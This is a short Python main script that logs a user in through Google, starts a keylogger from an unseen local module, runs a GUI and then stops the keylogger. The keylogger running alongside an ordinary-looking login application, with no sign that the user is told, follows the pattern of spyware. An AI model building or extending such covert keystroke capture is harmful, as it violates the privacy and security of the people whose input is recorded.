from auth import login_with_google
from gui import launch_gui
from keylogger import start_keylogger

if __name__ == "__main__":
    user = login_with_google()
    listener = start_keylogger()
    launch_gui(user)
    listener.stop()
